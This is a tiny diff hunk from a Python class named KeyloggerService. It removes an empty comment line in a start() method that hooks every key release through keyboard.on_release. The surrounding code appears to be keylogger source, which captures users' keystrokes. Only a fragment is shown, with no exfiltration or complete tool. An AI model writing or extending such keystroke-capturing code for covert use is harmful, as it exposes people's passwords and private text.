@@ -21,7 +21,6 @@ class KeyloggerService:
         return temp_data
 
     def start(self):
-        #
         keyboard.on_release(self.handle_input)
 
     @staticmethod
